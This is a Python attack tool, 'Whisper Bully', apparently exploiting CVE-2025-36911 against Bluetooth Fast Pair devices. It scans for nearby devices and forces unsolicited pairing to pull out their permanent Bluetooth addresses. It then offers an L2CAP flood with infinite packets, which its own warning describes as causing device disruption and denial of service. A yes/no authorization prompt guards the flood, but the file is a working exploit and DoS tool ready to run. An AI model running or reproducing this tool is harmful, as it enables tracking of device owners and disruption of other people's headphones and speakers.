#!/usr/bin/env python3
"""
Whisper Bully: Fast Pair BD ADDR Extractor
Extracts permanent Bluetooth addresses from devices using CVE-2025-36911.
"""

import asyncio
import subprocess
import re
import os
import time
import argparse
import json
import signal
import sys
from typing import List, Optional, Tuple
from dataclasses import dataclass

try:
    from bleak import BleakScanner, BleakClient
except ImportError:
    print("Install bleak: pip install bleak")
    exit(1)


FAST_PAIR_SERVICE = "0000fe2c-0000-1000-8000-00805f9b34fb"
FAST_PAIR_16BIT = "fe2c"
PAIRING_TIMEOUT = 30  # seconds to wait for pairing result


@dataclass
class Device:
    address: str
    name: str
    rssi: int


def reset_bluetooth() -> None:
    """Reset Bluetooth adapter by powering off and on."""
    info("Resetting Bluetooth adapter...")
    try:
        subprocess.run(['sudo', 'bluetoothctl', 'power', 'off'], check=True, timeout=5)
        time.sleep(1)
        subprocess.run(['sudo', 'bluetoothctl', 'power', 'on'], check=True, timeout=5)
        time.sleep(2)  # Give time for adapter to reinitialize
        ok("Bluetooth adapter reset complete.")
    except Exception as e:
        warn(f"Failed to reset Bluetooth: {e}")


def get_all_devices() -> List[Tuple[str, str]]:
    """Query bluetoothctl for all known devices."""
    try:
        out = subprocess.check_output(
            ['sudo', 'bluetoothctl', 'devices'],
            text=True,
            timeout=5
        )
        devices = []
        for line in out.splitlines():
            m = re.search(r'Device\s+([0-9A-F:]{17})\s+(.+)', line, re.I)
            if m:
                devices.append((m.group(1), m.group(2)))
        return devices
    except subprocess.TimeoutExpired:
        return []
    except Exception:
        return []


def get_paired_devices() -> List[Tuple[str, str]]:
    """Query bluetoothctl for paired devices only."""
    try:
        out = subprocess.check_output(
            ['sudo', 'bluetoothctl', 'paired-devices'],
            text=True,
            timeout=5
        )
        devices = []
        for line in out.splitlines():
            m = re.search(r'Device\s+([0-9A-F:]{17})\s+(.+)', line, re.I)
            if m:
                devices.append((m.group(1), m.group(2)))
        return devices
    except subprocess.TimeoutExpired:
        return []
    except Exception:
        return []


def is_paired(addr: str) -> bool:
    """Check if device is already paired."""
    try:
        out = subprocess.check_output(
            ['sudo', 'bluetoothctl', 'info', addr],
            text=True,
            timeout=5
        )
        return "Paired: yes" in out
    except (subprocess.TimeoutExpired, subprocess.CalledProcessError):
        return False


def set_agent(agent: str = "NoInputNoOutput") -> None:
    """Set bluetoothctl agent and mark as default."""
    try:
        subprocess.run(
            ['sudo', 'bluetoothctl', 'agent', agent],
            timeout=5,
            capture_output=True
        )
        subprocess.run(
            ['sudo', 'bluetoothctl', 'default-agent'],
            timeout=5,
            capture_output=True
        )
    except subprocess.TimeoutExpired:
        pass


async def scan_fastpair(duration: int = 10) -> List[Device]:
    """Scan for devices advertising Fast Pair service."""
    found = []

    def callback(dev, adv):
        has_fastpair = any(
            FAST_PAIR_SERVICE.lower() in u.lower() or
            FAST_PAIR_16BIT.lower() in u.lower()
            for u in adv.service_uuids
        )
        if not has_fastpair:
            return

        # bleak fires the callback multiple times per advertisement burst
        if any(d.address == dev.address for d in found):
            return

        rssi = adv.rssi if adv.rssi is not None else -100
        found.append(Device(dev.address, dev.name or "Unknown", rssi))

    scanner = BleakScanner(callback, scanning_mode="active")
    await scanner.start()
    await asyncio.sleep(duration)
    await scanner.stop()
    return found


async def run_aggressive_test(results: List[dict], output_file: str = None) -> None:
    """
    Prompt for and optionally run aggressive L2CAP testing on extracted addresses.
    """
    print(); div("═")
    print(f"  {YELLOW}⚠️  LEGAL WARNING — READ BEFORE PROCEEDING{RESET}")
    div("═")
    warn("Aggressive L2CAP flooding causes device disruption and DoS.")
    warn(f"Unauthorized use on devices you don't own is a {BRED}FEDERAL CRIME{RESET}{YELLOW}.")
    print(f"\n{WHITE}You may ONLY test devices:{RESET}")
    print(f"  {CYAN}•{RESET} You own")
    print(f"  {CYAN}•{RESET} With EXPLICIT WRITTEN permission from the owner")
    info("See LEGAL_WARNING.md for full details.")
    div("═"); print()

    try:
        auth_confirm = input(
            "Do you have authorization to flood these devices? Type 'yes' to continue: "
        ).strip().lower()
    except KeyboardInterrupt:
        info("\nInterrupted. Exiting.")
        sys.exit(0)

    if auth_confirm != "yes":
        info("Aggressive test cancelled.")
        return

    try:
        duration_input = input("Flood duration: seconds or 'f' for forever (default 60): ").strip().lower()
    except KeyboardInterrupt:
        print("\n[*] Interrupted. Exiting.")
        sys.exit(0)

    if duration_input == 'f':
        duration = None
    else:
        try:
            duration = int(duration_input) if duration_input else 60
        except ValueError:
            duration = 60

    try:
        threads = input("Number of threads (default: CPU count): ").strip()
    except KeyboardInterrupt:
        print("\n[*] Interrupted. Exiting.")
        sys.exit(0)

    try:
        threads = int(threads) if threads else None
    except ValueError:
        threads = None

    try:
        hci = input("HCI adapter (default: any, e.g., hci0): ").strip()
    except KeyboardInterrupt:
        print("\n[*] Interrupted. Exiting.")
        sys.exit(0)

    hci = hci if hci else None

    reset_bluetooth()

    print(); info(f"Starting aggressive L2CAP flood on {CYAN}{len(results)}{RESET} device(s)...")
    if duration is None:
        print(f"    {DIM}Duration :{RESET} {YELLOW}FOREVER{RESET} (Ctrl+C to stop)")
    else:
        print(f"    {DIM}Duration :{RESET} {duration}s")
    if threads:
        print(f"    {DIM}Threads  :{RESET} {threads}")
    if hci:
        print(f"    {DIM}HCI      :{RESET} {hci}")
    print()

    for i, result in enumerate(results, 1):
        permanent_addr = result.get("permanent_address")
        device_name = result.get("device_name")

        print(); div(); info(f"Target {CYAN}{i}/{len(results)}{RESET}: {WHITE}{device_name}{RESET} ({CYAN}{permanent_addr}{RESET}")

        cmd = ["sudo", "l2flood", "-R"]
        if hci:
            cmd.extend(["-i", hci])
        if threads:
            cmd.extend(["-n", str(threads)])
        cmd.extend(["-c", "-1"])  # Infinite packets
        cmd.append(permanent_addr)

        try:
            proc = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )

            try:
                if duration is None:
                    proc.wait()
                    proc.wait(timeout=duration)
            except subprocess.TimeoutExpired:
                info("Duration limit reached, stopping flood...")
                proc.send_signal(2)  # SIGINT
                try:
                    proc.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    proc.kill()
            except KeyboardInterrupt:
                proc.send_signal(2)  # SIGINT
                try:
                    proc.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    proc.kill()
                info("\nFlood stopped. Exiting.")
                sys.exit(0)

            stdout, stderr = proc.communicate()
            if stdout:
                print(f"  {DIM}{stdout.strip()[:100]}{RESET}")
            ok(f"Flood completed for {device_name}")

        except FileNotFoundError:
            err("l2flood not found. Build it: make && sudo make install")
            return
        except Exception as e:
            err(f"Error: {e}")

        if i < len(results):
            await asyncio.sleep(2)

    print(); ok(f"Aggressive testing completed on {CYAN}{len(results)}{RESET} device(s)")


async def extract_bdaddr(device_addr: str, device_name: str) -> Optional[str]:
    """
    Extract permanent BD ADDR by triggering pairing while monitoring for
    [CHG] Device messages in bluetoothctl output.
    Returns permanent address or None on failure.
    """
    client = None
    try:
        info(f"Establishing BLE connection to {CYAN}{device_addr}{RESET}...")
        client = BleakClient(device_addr, timeout=10.0)
        await client.connect()
        ok("Connected")

        set_agent("NoInputNoOutput")
        await asyncio.sleep(1)

        # service check is advisory — pairing is attempted regardless
        fp_found = any(
            FAST_PAIR_SERVICE.lower() in str(svc.uuid).lower() or
            FAST_PAIR_16BIT.lower() in str(svc.uuid).lower()
            for svc in client.services
        )
        if fp_found:
            ok("Fast Pair service confirmed")
        else:
            warn("Fast Pair service not found — attempting pairing anyway")

    except Exception as e:
        err(f"BLE connection failed: {e}")
        return None

    bonded_addr = None
    pairing_success = False

    try:
        info("Running pairing (monitoring for permanent address)...")

        proc = subprocess.Popen(
            ['sudo', 'bluetoothctl', 'pair', device_addr],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1
        )

        start_time = time.time()

        for line in proc.stdout:
            print(f"  {DIM}{line.rstrip()}{RESET}")

            # "Bonded: yes" is the authoritative signal; pairing output
            # doesn't always emit a separate address-changed event
            if "Bonded: yes" in line:
                m = re.search(r'Device\s+([0-9A-F:]{17})', line, re.I)
                if m:
                    bonded_addr = m.group(1)
                    hit(f"CAPTURED BONDED ADDRESS: {bonded_addr}")

            if "Pairing successful" in line:
                pairing_success = True

            if time.time() - start_time > PAIRING_TIMEOUT:
                break

        proc.wait(timeout=10)

        if bonded_addr:
            return bonded_addr

        if pairing_success:
            info("Pairing succeeded — scanning for address...")
            await asyncio.sleep(2)

    except Exception as e:
        warn(f"Pairing error: {e}")
    finally:
        if client and client.is_connected:
            try:
                await client.disconnect()
            except Exception:
                pass

    try:
        await asyncio.sleep(1)
        all_devs = get_all_devices()

        info(f"Device list ({CYAN}{len(all_devs)}{RESET} total):")
        for addr, name in all_devs:
            marker = ""
            if device_name.lower() in name.lower():
                if addr.lower() != device_addr.lower():
                    marker = " ← PERMANENT"
                else:
                    marker = " (temporary)"
            print(f"    {CYAN}{addr}{RESET}  {WHITE}{name}{RESET}{BGREEN}{marker}{RESET}")

        for addr, name in all_devs:
            if (device_name.lower() in name.lower() and
                    addr.lower() != device_addr.lower()):
                print(); hit(f"EXTRACTED PERMANENT ADDRESS: {addr}")
                return addr

    except Exception as e:
        warn(f"Device scan failed: {e}")

    return None


ASCII_ART = """
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠟⠛⠛⠉⠉⠉⣉⣉⣉⣉⣉⣉⣁⣠⣤⣤⣤⣤⣤⣄⠀⠀⠉⠉⠉⠛⠛⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⢟⡍⣤⣶⣄⠀⣶⣿⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣿⣆⢀⣠⣾⣶⣦⡈⠻⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡿⣵⣿⡇⣿⣿⣿⣿⣿⣿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠟⠿⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⡟⣦⡈⢿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⠋⣴⣿⣿⡇⢻⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⣿⣿⣿⣿⣿⢱⣿⣷⠀⢻⣿⣿⣿⣿
⣿⣿⣿⡿⠁⢰⣯⢻⣿⣷⡘⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⡿⢡⣿⣿⣿⡇⠸⣿⣿⣿⣿
⣿⣿⠟⠀⠀⠀⠙⠊⠻⠟⠣⠈⠻⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⡿⠏⠴⠟⣿⡿⢋⣴⡀⢻⣿⣿⣿
⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠟⠋⠀⠀⠀⠀⠀⠀⠈⠁⠀⠀⠻⣿⣿
⠁⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣴⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢶⣦⣤⣀⠀⠀⠀⠀⠀⠀⠀⠈⢻
⡀⠀⠀⠀⠀⠀⠀⠀⢈⣿⣿⣿⣷⠆⠀⠀⠀⢀⣤⠶⣲⠻⣭⠙⢩⡉⢝⡓⠒⠦⣄⠀⠀⠀⠀⠀⢠⣬⣿⣟⠉⠀⠀⠀⠀⠀⠀⠀⠀⢸
⣇⠀⠀⠀⠀⠀⠀⠀⢩⣽⣿⣿⣿⡶⠀⠀⣼⠋⠺⠌⠋⠀⠛⠀⠙⠋⠡⠟⠀⣷⠈⢻⡄⠀⠀⠀⢶⣿⣿⣿⡿⡆⠀⠀⠀⠀⠀⠀⠀⣸
⣿⣆⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣧⠀⠀⠀⠙⠧⣄⡆⠰⡄⢦⠄⣠⠆⣠⠆⢠⢆⡠⠞⠁⠀⠀⢀⣼⣿⣿⣿⠿⠃⠀⠀⠀⠀⠀⠀⣠⣿
⣿⣿⣧⡀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣄⣀⠀⠀⠀⠛⠻⠤⠤⠤⠤⠤⠧⠤⠟⠛⠀⠀⠀⣀⣤⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿
⣿⣿⣿⣿⣦⣄⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣷⣶⣶⣦⣤⣤⣤⣤⣤⣤⣤⣤⣶⣶⣶⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀⠀⠀⢀⣠⣾⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣶⣤⣀⠈⠻⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠁⠀⠀⣀⣤⣶⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣤⣍⣙⡛⠻⠿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⠟⣛⣛⣉⣭⣥⣤⣴⣶⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
"""

# ── colours ──────────────────────────────────────────────────────────────────
RED     = "\033[91m"
BRED    = "\033[1;91m"
GREEN   = "\033[92m"
BGREEN  = "\033[1;92m"
YELLOW  = "\033[93m"
CYAN    = "\033[96m"
BCYAN   = "\033[1;96m"
WHITE   = "\033[97m"
DIM     = "\033[2m"
RESET   = "\033[0m"

def info(msg):    print(f"{DIM}{WHITE}[*]{RESET} {msg}")
def ok(msg):      print(f"{BGREEN}[+]{RESET} {msg}")
def warn(msg):    print(f"{YELLOW}[!]{RESET} {msg}")
def err(msg):     print(f"{RED}[-]{RESET} {msg}")
def hit(msg):     print(f"{BGREEN}[+++]{RESET} {BGREEN}{msg}{RESET}")
def div(char="─", n=66): print(f"{DIM}{char * n}{RESET}")

def print_banner():
    print(RED + ASCII_ART + RESET)
    div("═")
    print(f"  {BRED}Whisper Bully{RESET}  {DIM}·{RESET}  Fast Pair BD ADDR Extractor")
    print(f"  {DIM}CVE-2025-36911  ·  github.com/your-org/whisper-bully{RESET}")
    div("═")
    print()


async def main():
    print_banner()
    parser = argparse.ArgumentParser(
        description="Whisper Bully: Fast Pair BD ADDR Extractor (CVE-2025-36911)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  sudo python3 wb.py                    # Auto-extract all devices
  sudo python3 wb.py -o results.json    # Save to file
  sudo python3 wb.py -s 20              # Custom 20s scan time
  sudo python3 wb.py -o out.json -s 15  # Combined options
        """
    )
    parser.add_argument(
        "-o", "--output",
        type=str,
        help="Save results to JSON file"
    )
    parser.add_argument(
        "-s", "--scan-time",
        type=int,
        default=10,
        help="Scan duration in seconds (default: 10)"
    )
    parser.add_argument(
        "--aggressive",
        action="store_true",
        help="Skip prompts and run aggressive test immediately (requires prior authorization)"
    )
    args = parser.parse_args()

    if os.geteuid() != 0:
        err("This script requires root. Run with sudo.")
        return



    info(f"Scanning for Fast Pair devices ({CYAN}{args.scan_time}s{RESET})...")
    devices = await scan_fastpair(args.scan_time)

    if not devices:
        err("No Fast Pair devices found.")
        return

    ok(f"Found {CYAN}{len(devices)}{RESET} device(s):")
    for i, dev in enumerate(devices, 1):
        print(f"  {CYAN}{i}.{RESET} {WHITE}{dev.name}{RESET}  {DIM}{dev.address}{RESET}  RSSI: {dev.rssi} dBm")

    if len(devices) == 1:
        selected = [devices[0]]
        print(); info(f"Single device found — auto-selecting: {WHITE}{devices[0].name}{RESET}")
    else:
        while True:
            selection = input(
                "\nSelect device(s) [number, comma-separated, or 'a' for all]: "
            ).strip().lower()

            if selection == "a":
                selected = devices
                info(f"Selected all {CYAN}{len(devices)}{RESET} device(s)")
                break

            try:
                indices = [int(x.strip()) - 1 for x in selection.split(",")]
                if all(0 <= idx < len(devices) for idx in indices):
                    selected = [devices[idx] for idx in indices]
                    info(f"Selected {CYAN}{len(selected)}{RESET} device(s)")
                    break
                else:
                    err("Invalid selection. Try again.")
            except ValueError:
                err("Invalid input. Use numbers (e.g., '1' or '1,3,5') or 'a'")

    results = []
    print(); info(f"Extracting {CYAN}{len(selected)}{RESET} device(s)..."); print()

    for dev in selected:
        div(); info(f"Processing: {WHITE}{dev.name}{RESET}  {DIM}{dev.address}{RESET}")
        permanent_addr = await extract_bdaddr(dev.address, dev.name)

        if permanent_addr:
            div("═")
            hit(f"PERMANENT BD ADDR : {permanent_addr}")
            print(f"  {DIM}Temp address     : {dev.address}{RESET}")
            print(f"  {DIM}Device name      : {dev.name}{RESET}")
            div("═"); print()
            results.append({
                "device_name": dev.name,
                "temporary_address": dev.address,
                "permanent_address": permanent_addr,
                "rssi": dev.rssi
            })
        else:
            err("Failed to extract.\n")

    if args.output:
        try:
            with open(args.output, 'w') as f:
                json.dump(results, f, indent=2)
            print(); ok(f"Results saved to: {WHITE}{args.output}{RESET}")
            ok(f"Extracted {BGREEN}{len(results)}/{len(selected)}{RESET} device(s)")
        except IOError as e:
            err(f"Failed to save file: {e}")
    else:
        if results:
            print(); ok(f"Successfully extracted {BGREEN}{len(results)}/{len(selected)}{RESET} device(s)")
        else:
            print(); err("No devices extracted.")

    if results and len(results) > 0:
        if args.aggressive:
            await run_aggressive_test(results, args.output)
        else:
            print(); div("═")
            print(f"  {YELLOW}⚠️  AGGRESSIVE L2CAP TESTING (OPTIONAL){RESET}")
            div("═")
            print(); info(f"Found {CYAN}{len(results)}{RESET} extracted device(s).")
            info(f"You can now run aggressive L2CAP flood testing using {WHITE}l2flood -R{RESET} mode.")
            warn("This requires explicit authorization for each device."); print()

            aggressive_prompt = input(
                "Run aggressive L2CAP test on extracted addresses now? (yes/no): "
            ).strip().lower()

            if aggressive_prompt == "yes":
                print(); info("Starting aggressive test mode...")
                await run_aggressive_test(results, args.output)


if __name__ == "__main__":
    def signal_handler(sig, frame):
        """Clean exit on Ctrl+C without traceback."""
        print(); info("Interrupted by user. Exiting cleanly...")
        sys.exit(0)

    signal.signal(signal.SIGINT, signal_handler)

    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n\n[*] Interrupted by user. Exiting cleanly...")
        sys.exit(0)
    except Exception as e:
        err(f"Unexpected error: {e}")
        sys.exit(1)
